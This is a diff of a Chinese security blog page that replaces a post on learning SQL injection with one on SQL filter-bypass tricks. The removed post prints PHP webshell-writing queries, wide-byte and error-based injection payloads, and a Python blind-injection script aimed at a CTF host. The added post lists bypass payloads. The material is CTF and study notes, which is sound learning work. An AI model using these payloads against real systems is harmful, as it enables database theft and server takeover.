@@ -138,10 +138,10 @@
   <!--[if lt IE 9]> <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script> <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> <![endif]-->
 
   <!-- ga & ba script hoook -->
-  <link rel="canonical" href="http://yoursite-url/2021/03/05/SQL注入攻击的学习/">
+  <link rel="canonical" href="http://yoursite-url/2021/03/07/SQL的各种绕过/">
   <title>
     
-    SQL注入攻击的学习 - gungnir | 九日
+    SQL的各种绕过 - gungnir | 九日
     
   </title>
 <meta name="generator" content="Hexo 4.2.1"></head>
@@ -321,14 +321,12 @@
               
               <a class="tag" href="/tags/#SQL" title="SQL">SQL</a>
               
-              <a class="tag" href="/tags/#白帽子讲WEB安全" title="白帽子讲WEB安全">白帽子讲WEB安全</a>
-              
             </div>
-            <h1>SQL注入攻击的学习</h1>
-            <h2 class="subheading">白帽子讲WEB安全</h2>
+            <h1>SQL的各种绕过</h1>
+            <h2 class="subheading">WEB</h2>
             <span class="meta">
               Posted by gungnir on
-              2021-03-05
+              2021-03-07
             </span>
 
 
@@ -336,11 +334,11 @@
             <!-- WordCount start -->
             <div class="blank_box"></div>
             <span class="meta">
-              Estimated Reading Time <span class="post-count">7</span> Minutes
+              Estimated Reading Time <span class="post-count">10</span> Minutes
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">1.9k</span> In Total
+              Words <span class="post-count">2.4k</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -402,128 +400,182 @@
       <!-- Post Container -->
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
 
-        <h1 id="《白帽子讲web安全》SQL注入深度学习"><a href="#《白帽子讲web安全》SQL注入深度学习" class="headerlink" title="《白帽子讲web安全》SQL注入深度学习"></a>《白帽子讲web安全》SQL注入深度学习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>注入攻击是Web安全领域最为常见的攻击方式。在“跨站脚本攻击XSS的学习”一文中，提到XSS也是一种针对HTML的注入攻击，而sql注入，则是针对数据库的一种注入攻击</p>
-<p><strong>注入攻击两个条件</strong>：</p>
-<ol>
-<li>用户能够控制数据的输入</li>
-<li>原本要执行的代码，拼接了用户的输入</li>
-</ol>
-<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>在MYSQL中有个函数，用来测试函数性能的，BENCHMARK（）函数，他有两个参数</p>
-<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="constructor">BENCHMARK(<span class="params">count</span>,<span class="params">expr</span>)</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="BENCHMARK.png.jpg" alt="BENCHMARK.png"></p>
-<p>可以看到上图将encode执行了100000000次，花了10秒</p>
-<p>利用BENCHMARK函数可以进行盲注，配合if语句</p>
-<h2 id="读写文件注入（load-file）"><a href="#读写文件注入（load-file）" class="headerlink" title="读写文件注入（load_file）"></a>读写文件注入（load_file）</h2><p><strong>load_file()函数</strong> </p>
-<p>当想要注入一个shell的时候，用了这么个语句</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php eval($_POST[123]) ?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'D:/phpstudy_pro/WWW/123.php'</span>;</span><br></pre></td></tr></table></figure>
-
-<p>意思为，将马写入目标文件</p>
-<p>但是，我遇到了一个问题</p>
-<p><img src="image-20210221151907722.png" alt="image-20210221151907722"></p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">ERROR</span> 1290 (HY000): The MySQL<span class="built_in"> server </span>is running with the --secure-file-priv option so it cannot execute this statement</span><br></pre></td></tr></table></figure>
-
-<p>高版本的MYSQL添加了一个新的特性secure_file_priv，该选项限制了mysql导出文件的权限<strong>secure_file_priv选项</strong></p>
-<h4 id="查看secure-file-priv的命令"><a href="#查看secure-file-priv的命令" class="headerlink" title="查看secure_file_priv的命令"></a>查看secure_file_priv的命令</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%secure%'</span>;</span><br></pre></td></tr></table></figure>
-
-<p><img src="image-20210221152520127.png" alt="image-20210221152520127"></p>
-<p><strong>secure_file_priv选项</strong></p>
-<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">secure_file_priv </span><br><span class="line"></span><br><span class="line">　　<span class="number">1</span>、限制mysqld 不允许导入 | 导出</span><br><span class="line">　   　   <span class="comment">--secure_file_prive=null</span></span><br><span class="line"></span><br><span class="line">　　<span class="number">2</span>、限制mysqld 的导入 | 导出 只能发生在/tmp/目录下</span><br><span class="line">　　　   <span class="comment">--secure_file_priv=/tmp/</span></span><br><span class="line"></span><br><span class="line">　　<span class="number">3</span>、不对mysqld 的导入 | 导出做限制</span><br><span class="line">              <span class="comment">--secure_file_priv= </span></span><br><span class="line"></span><br><span class="line">linux</span><br><span class="line">cat /etc/<span class="keyword">my</span>.cnf</span><br><span class="line">　　　　[mysqld]</span><br><span class="line">　　　　secure_file_priv= </span><br><span class="line"></span><br><span class="line">win</span><br><span class="line">    <span class="keyword">my</span>.ini</span><br><span class="line">       [mysqld]</span><br><span class="line"> 　　　　secure_file_priv=</span><br></pre></td></tr></table></figure>
-
-<p>我这里是NULL，所以是不允许导出</p>
-<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><ol>
-<li><p>要不然你能把配置改了</p>
+        <h3 id="普通绕过策略"><a href="#普通绕过策略" class="headerlink" title="普通绕过策略"></a>普通绕过策略</h3><p>双写、在敏感词汇中添加注释、利用符号替代</p>
+<h4 id="利用符号替代"><a href="#利用符号替代" class="headerlink" title="利用符号替代"></a>利用符号替代</h4><ol>
+<li><p>and</p>
+<p>^  、&amp;&amp;  </p>
 </li>
-<li><p>要知道路径</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log=<span class="keyword">on</span>;<span class="keyword">set</span> <span class="keyword">global</span> general_log_file=<span class="string">'C:/phpStudy/WWW/123.php'</span>;<span class="keyword">select</span> <span class="string">'&lt;?php eval($_POST[123]) ?&gt;'</span>;</span><br></pre></td></tr></table></figure>
-
+<li><p>or</p>
+<p>∨、||</p>
+</li>
+<li><p>空格</p>
+<p>注释（/**/）、括号、${IFS}$、$IFS$1</p>
+</li>
+<li><p>=</p>
+<p>like、也可以用&lt;&gt;来绕过</p>
 </li>
 </ol>
-<p><img src="image-20210221152940897.png" alt="image-20210221152940897"></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log = <span class="keyword">on</span>;  <span class="comment">#开启general log模式</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file = <span class="string">'D:\\phpStudy\www\\waf\\shell.php'</span>; <span class="comment">#设置写入shell路径</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php eval($_POST[cmd]);?&gt;'</span>  <span class="comment">#写入shell</span></span><br></pre></td></tr></table></figure>
-
-<p>之后再写木马，就会默认到这里</p>
-<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h4 id="0x01-认识addslashes"><a href="#0x01-认识addslashes" class="headerlink" title="0x01 认识addslashes"></a>0x01 认识addslashes</h4><p>在基于php对sql注入的防御里，总会提到这个函数。</p>
-<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">addslashes </span>( <span class="keyword">string </span>$<span class="keyword">str </span>) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
-
-<p>在php官方文档中，对该函数的说明如下：<br><strong>返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（’）、双引号（”）、反斜线（）与 NUL（NULL 字符）。</strong></p>
-<p>举例：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = <span class="string">"Is your name O'reilly?"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出： Is your name O\'reilly?</span></span><br><span class="line"><span class="keyword">echo</span> addslashes($str);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>对于最简单的字符型数字型注入，经改函数转义的sql语句确实会“卡死“单引号。（构造攻击的sql语句不会执行）</p>
-<p>但对于该函数的绕过，其实并不困难，无非两点：<br><strong>1.在前面再加一个（或单数个），变成（ ‘）,可以导致被转义，从而让‘逃出限制。</strong><br><strong>2.把弄没。**</strong></p>
-<p>在下面的例子中你可以体会到，若是该数据库采用了宽字节的编码，这个函数就变成了纸老虎。</p>
-<h4 id="0x02-宽字节注入原理"><a href="#0x02-宽字节注入原理" class="headerlink" title="0x02 宽字节注入原理"></a>0x02 宽字节注入原理</h4><p>宽字节注入利用了mysql一个特性，<strong>即当mysql在使用GBK编码的时候，会认为两个字符是一个汉字</strong>。（前一个ASCII码<strong>要大于128</strong>，才到汉字的范围）</p>
-<p>先了解一下这些字符的url编码：</p>
-<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">空格  <span class="comment">%20</span></span><br><span class="line">'    <span class="comment">%27</span></span><br><span class="line">#    <span class="comment">%23</span></span><br><span class="line">\     <span class="comment">%5C</span></span><br></pre></td></tr></table></figure>
-
-<p>当输入单引号，经addslashes转义后，对应的url编码是：<br><strong>‘ –&gt; &#39; –&gt; %5C%27</strong><br>当在前面引入一个ASCII大于128的字符（比如%df），url编码变为：<br><strong>%df –&gt; %df \ ‘ –&gt; （%df%5C）%27</strong></p>
-<p>若使用gbk编码的话，<strong>%df%5C会被当作一个汉字处理</strong>，从而使%27（单引号）逃出生天，成功绕过</p>
-<h2 id="SQL-Column-Truncation-长度绕过"><a href="#SQL-Column-Truncation-长度绕过" class="headerlink" title="SQL Column Truncation(长度绕过)"></a>SQL Column Truncation(长度绕过)</h2><p>在MySQL配置文件中，有个sql_mode选项。当选项没有被开启，Mysql对于用户插入的超长的值只会提示warning，而不会error，这时候就有可能导致越权</p>
-<p>比如已经有了 admin:admin  passwd:password</p>
-<p>如果我们开启了选项</p>
-<p>那么我们用户输入</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> admin: admin[<span class="string"></span>][<span class="symbol"></span>][<span class="string"></span>][<span class="symbol"></span>][<span class="string"></span>][<span class="symbol"></span>][<span class="string"></span>][<span class="symbol"></span>][<span class="string"></span>][<span class="symbol"></span>]1</span><br><span class="line"> passwd:new_password</span><br><span class="line"> []代表空格</span><br><span class="line"></span><br><span class="line">实际上admin的字符限制会将空格截断</span><br><span class="line">数据库接受的是admin:admin[<span class="string"></span>][<span class="symbol"></span>][<span class="string"></span>][<span class="symbol"></span>][<span class="string"></span>][<span class="symbol"></span>]</span><br><span class="line">passwd:new_password</span><br></pre></td></tr></table></figure>
-
-<p>那么就可以用新的密码来登录admin</p>
-<h2 id="CTF技巧"><a href="#CTF技巧" class="headerlink" title="CTF技巧"></a>CTF技巧</h2><h3 id="被过滤"><a href="#被过滤" class="headerlink" title="被过滤"></a>被过滤</h3><h4 id="information"><a href="#information" class="headerlink" title="information"></a>information</h4><p>information被过滤不要紧，还有</p>
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sys.x$schem<span class="built_in">a_table</span>_statistics_with_buffer</span><br><span class="line">sys.x$schem<span class="built_in">a_flattened</span>_keys</span><br><span class="line">sys.schem<span class="built_in">a_auto</span>_increment_columns</span><br><span class="line">这三个表里面有table_name</span><br></pre></td></tr></table></figure>
-
-<h4 id="and-or-空格-等连接词"><a href="#and-or-空格-等连接词" class="headerlink" title="and or 空格 等连接词"></a>and or 空格 等连接词</h4><p>连接符号除了and or 还有&amp;&amp; || ^,可以试试看有没有盲注什么的</p>
-<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">||在mysql中是如果后面的是对的那就结果为1，如果后面的是错的那么就是前面的</span></span><br></pre></td></tr></table></figure>
-
-<p>更多的在本博客另一篇文章 《sql的各种绕过》中</p>
-<h3 id="无列表注入"><a href="#无列表注入" class="headerlink" title="无列表注入"></a>无列表注入</h3><p>利用（x,x）&gt;(select * from 表)样式</p>
-<p>假设 flag 为 flag {bbbbb}，对于 payload 这个两个 select 查询的比较，是按位比较的，即先比第一位，如果相等则比第二位，以此类推；在某一位上，如果前者的 ASCII 大，不管总长度如何，ASCII 大的则大，这个不难懂，和 c 语言的 <code>strcmp()</code> 函数原理一样，举几个例子：</p>
-<ul>
-<li>glag &gt; flag{bbbbb}</li>
-<li>alag{zzzzzzzzzzz} &lt; flag{bbbbb}</li>
-<li>a &lt; flag{bbbbb}</li>
-<li>z &gt; flag{bbbbb}</li>
-</ul>
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>floor()</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),(concat(floor(rand(0)<span class="number">*2</span>),(select version())))x <span class="keyword">from</span><span class="built_in"> user group </span>by x</span><br></pre></td></tr></table></figure>
-
-<p>updatexml()</p>
-<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(<span class="number">1</span>,concat('~',(<span class="name">select</span> database()),'~'),<span class="number">3</span>)<span class="comment">;三个参数位</span></span><br></pre></td></tr></table></figure>
-
-<p>extractvalue()</p>
-<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> extractvalue(<span class="literal">null</span>,concat(<span class="number">0x7e</span>,(select datadir),<span class="number">0x7e</span>))两个参数位</span><br></pre></td></tr></table></figure>
-
-<p>==updatexml和extractvalue函数的返回长度有限,均为32个字符长度==</p>
-<h3 id="转义注入"><a href="#转义注入" class="headerlink" title="转义注入"></a>转义注入</h3><p>特点为有两个变量，比如有admin和passwd，这时可以在前一个变量最后加上\转义后面的单引号，导致后面变量的前一个单引号被闭合，再在第二个变量处进行注入，为转义注入</p>
-<p>例子：</p>
-<h4 id="BJDCTF-2nd-简单注入"><a href="#BJDCTF-2nd-简单注入" class="headerlink" title="[BJDCTF 2nd]简单注入"></a>[BJDCTF 2nd]简单注入</h4><p>因为是简单注入</p>
-<p>我一开始就是  ‘ 加上去，被过滤了</p>
-<p>所以我fuzz了一下，发现常用的基本都被过滤了，而且，最重要的是闭合的符号都被过滤了</p>
-<p>百思不得其解</p>
-<p>看了师傅的wp，才知道robots.txt里有提示有hint.txt</p>
-<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210128194002220.png" alt="image-20210128194002220"></p>
-<p>因为此题特点是闭合符号被过滤，所以只有一种方法可以绕过，就是在username的参数最后加上 ,作为转义符，把源代码中的 ‘ 转义，使得源代码变成</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">' \'</span><span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'和恶意代码</span></span><br></pre></td></tr></table></figure>
-
-<p>用可以通过的关键字和符号，我们可以构建playload</p>
-<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^(ascii(substr(password,<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">1</span>)#</span><br></pre></td></tr></table></figure>
-
-<p>我们可以看到界面的反应，当我们 &gt;1 时，肯定是正确的，界面返回BJD needs to be stronger</p>
-<p>&lt;1时，返回You konw ,P3rh4ps needs a girl friend</p>
-<p>所以，我们可以列出脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># post提交方式的bool盲注</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 可以修改的playload</span></span><br><span class="line">playload = <span class="string">"http://d2fa3b89-fa11-4938-a2ff-2ca779a2076b.node3.buuoj.cn/index.php"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">char = <span class="string">""</span></span><br><span class="line">chars = []</span><br><span class="line"><span class="comment"># 验证的名单，按ascii顺序的</span></span><br><span class="line">yzs = <span class="string">"0123456789ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefzhigklmnopqrstuvwxyz"</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"系统开始注入"</span>)</span><br><span class="line">print(<span class="string">'-----------------------'</span>)</span><br><span class="line"><span class="comment"># 可以先手注判断有多少位，再修改9位响应位数</span></span><br><span class="line"><span class="comment"># for b in range(0, 5):  # b是第几个表，第几个字段</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header = &#123;<span class="string">'Host'</span>: <span class="string">'d2fa3b89-fa11-4938-a2ff-2ca779a2076b.node3.buuoj.cn'</span>,</span><br><span class="line">          <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0'</span>,</span><br><span class="line">          <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>,</span><br><span class="line">          <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span>,</span><br><span class="line">          <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">          <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">15</span>):  <span class="comment"># a是这个表或字段的第几个字母</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">129</span>):</span><br><span class="line">        playload_post = <span class="string">'^(ascii(substr(password,&#123;&#125;,1))&gt;&#123;&#125;)#'</span>.format(a, b)<span class="comment">#password可以改成username就能测出username</span></span><br><span class="line">        data = &#123;<span class="string">"username"</span>: <span class="string">"1\\"</span>, <span class="string">"password"</span>: playload_post&#125;</span><br><span class="line">        response = requests.post(playload, data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'girl'</span> <span class="keyword">in</span> response.text:  <span class="comment"># 判断条件自己修改</span></span><br><span class="line">            print(b)</span><br><span class="line">            char += str(chr(b))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(char)</span><br><span class="line">chars.append(char)</span><br><span class="line">char = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">'-------------------------'</span>)</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">    print(c)</span><br><span class="line">print(<span class="string">'-------------------------end'</span>)</span><br></pre></td></tr></table></figure>
-
-<p>最后，将得到的username和password写入就能得到flag</p>
+<p><a href="https://blog.csdn.net/devil8123665/article/details/108746947#t1" target="_blank" rel="noopener">SQL注入一些过滤及绕过总结</a></p>
+<p><a href="https://blog.csdn.net/devil8123665/article/details/108746947#t2" target="_blank" rel="noopener">SQL注入绕过技巧</a></p>
+<p><a href="https://blog.csdn.net/devil8123665/article/details/108746947#t3" target="_blank" rel="noopener">1.绕过空格（注释符/* */，%a0）：</a></p>
+<p><a href="https://blog.csdn.net/devil8123665/article/details/108746947#t4" target="_blank" rel="noopener">2.括号绕过空格：</a></p>
+<p><a href="https://blog.csdn.net/devil8123665/article/details/108746947#t5" target="_blank" rel="noopener">3.引号绕过（使用十六进制）：</a></p>
+<p><a href="https://blog.csdn.net/devil8123665/article/details/108746947#t6" target="_blank" rel="noopener">4.逗号绕过（limit使用from或者offset）（substr使用from for属于逗号）：</a></p>
+<p><a href="https://blog.csdn.net/devil8123665/article/details/108746947#t7" target="_blank" rel="noopener">5.比较符号（&lt;&gt;）绕过（使用greatest()）：</a></p>
+<p><a href="https://blog.csdn.net/devil8123665/article/details/108746947#t8" target="_blank" rel="noopener">6.or and 绕过：</a></p>
+<p><a href="https://blog.csdn.net/devil8123665/article/details/108746947#t9" target="_blank" rel="noopener">7.绕过注释符号（#，–）过滤：</a></p>
+<p><a href="https://blog.csdn.net/devil8123665/article/details/108746947#t10" target="_blank" rel="noopener">8.=绕过：</a></p>
+<p><a href="https://blog.csdn.net/devil8123665/article/details/108746947#t11" target="_blank" rel="noopener">9.绕过union，select，where等：</a></p>
+<p><a href="https://blog.csdn.net/devil8123665/article/details/108746947#t12" target="_blank" rel="noopener">（1）使用注释符绕过：</a></p>
+<p><a href="https://blog.csdn.net/devil8123665/article/details/108746947#t13" target="_blank" rel="noopener">（2）使用大小写绕过：</a></p>
+<p><a href="https://blog.csdn.net/devil8123665/article/details/108746947#t14" target="_blank" rel="noopener">（3）内联注释绕过：</a></p>
+<p><a href="https://blog.csdn.net/devil8123665/article/details/108746947#t15" target="_blank" rel="noopener">（4） 双关键字绕过：</a></p>
+<p><a href="https://blog.csdn.net/devil8123665/article/details/108746947#t16" target="_blank" rel="noopener">10.通用绕过（编码）：</a></p>
+<p><a href="https://blog.csdn.net/devil8123665/article/details/108746947#t17" target="_blank" rel="noopener">11.等价函数绕过：</a></p>
+<p><a href="https://blog.csdn.net/devil8123665/article/details/108746947#t18" target="_blank" rel="noopener">12.宽字节注入：</a></p>
+<p><a href="https://blog.csdn.net/devil8123665/article/details/108746947#t19" target="_blank" rel="noopener">过滤*2</a></p>
+<hr>
+<h1 id="SQL注入一些过滤及绕过总结"><a href="#SQL注入一些过滤及绕过总结" class="headerlink" title="SQL注入一些过滤及绕过总结"></a>SQL注入一些过滤及绕过总结</h1><p><a href="https://blog.csdn.net/weixin_44300286/article/details/96597167" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44300286/article/details/96597167</a></p>
+<h1 id="SQL注入绕过技巧"><a href="#SQL注入绕过技巧" class="headerlink" title="SQL注入绕过技巧"></a>SQL注入绕过技巧</h1><p><a href="https://www.cnblogs.com/Vinson404/p/7253255.html" target="_blank" rel="noopener">https://www.cnblogs.com/Vinson404/p/7253255.html</a></p>
+<p>注入绕过技巧</p>
+<p><a href="https://www.jianshu.com/p/48a935b123ce" target="_blank" rel="noopener">https://www.jianshu.com/p/48a935b123ce</a></p>
+<h1 id="1-绕过空格（注释符-，-a0）："><a href="#1-绕过空格（注释符-，-a0）：" class="headerlink" title="1.绕过空格（注释符/* */，%a0）："></a>1.绕过空格（注释符/* */，%a0）：</h1><p>两个空格代替一个空格，用Tab代替空格，%a0=空格：</p>
+<p>%20%09%0a %0b %0c %0d %a0/**/</p>
+<p>最基本的绕过方法，用注释替换空格：</p>
+<p>/<em>注释</em>/</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/4d3b339fd774e21dbdb1b1e436d82e44.webp" alt="img"></p>
+<h1 id="2-括号绕过空格："><a href="#2-括号绕过空格：" class="headerlink" title="2.括号绕过空格："></a>2.括号绕过空格：</h1><p>如果空格被过滤，括号没有被过滤，可以用括号绕过。</p>
+<p>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
+<p>例如：</p>
+<p>select(user())fromdualwhere(1=1)and(2=2)</p>
+<p>这种过滤方法常常用于time based盲注,例如：</p>
+<p>?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</p>
+<p>（from for属于逗号绕过下面会有）</p>
+<p>上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。</p>
+<h1 id="3-引号绕过（使用十六进制）："><a href="#3-引号绕过（使用十六进制）：" class="headerlink" title="3.引号绕过（使用十六进制）："></a>3.引号绕过（<strong>使用十六进制</strong>）：</h1><p>会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</p>
+<p>selectcolumn_namefrominformation_schema.tableswheretable_name=”users”</p>
+<p>这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用<strong>十六进制</strong>来处理这个问题了。</p>
+<p>users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</p>
+<p>selectcolumn_namefrominformation_schema.tableswheretable_name=0x7573657273</p>
+<h1 id="4-逗号绕过（limit使用from或者offset）（substr使用from-for属于逗号）："><a href="#4-逗号绕过（limit使用from或者offset）（substr使用from-for属于逗号）：" class="headerlink" title="4.逗号绕过（limit使用from或者offset）（substr使用from for属于逗号）："></a>4.逗号绕过（limit<strong>使用from或者offset</strong>）（substr使用from for属于逗号）：</h1><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</p>
+<p>select substr(database(0from1for1);select mid(database(0from1for1);</p>
+<p>对于limit可以使用offset来绕过：</p>
+<p>select<em>fromnews limit0,1# 等价于下面这条SQL语句select</em>fromnews limit1offset0</p>
+<h1 id="5-比较符号（-lt-gt-）绕过（使用greatest-）："><a href="#5-比较符号（-lt-gt-）绕过（使用greatest-）：" class="headerlink" title="5.比较符号（&lt;&gt;）绕过（使用greatest()）："></a>5.比较符号（&lt;&gt;）绕过（<strong>使用greatest()</strong>）：</h1><p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。</p>
+<p>最常见的一个盲注的sql语句：</p>
+<p>select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</p>
+<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。</p>
+<p>那么上面的这条sql语句可以使用greatest变为如下的子句:</p>
+<p>select*fromuserswhereid=1and greatest(ascii(substr(database(),0,1)),64)=64</p>
+<h1 id="6-or-and-绕过："><a href="#6-or-and-绕过：" class="headerlink" title="6.or and 绕过："></a>6.or and 绕过：</h1><p>and=&amp;&amp; or=||</p>
+<h1 id="7-绕过注释符号（-，–）过滤："><a href="#7-绕过注释符号（-，–）过滤：" class="headerlink" title="7.绕过注释符号（#，–）过滤："></a>7.绕过注释符号（#，–）过滤：</h1><p>id=1’union select 1,2,3||’1</p>
+<p>最后的or ‘1闭合查询语句的最后的单引号，或者：</p>
+<p>id=1’union select 1,2,’3</p>
+<h1 id="8-绕过："><a href="#8-绕过：" class="headerlink" title="8.=绕过："></a>8.=绕过：</h1><p>使用like 或者 使用&lt; 或者 &gt;</p>
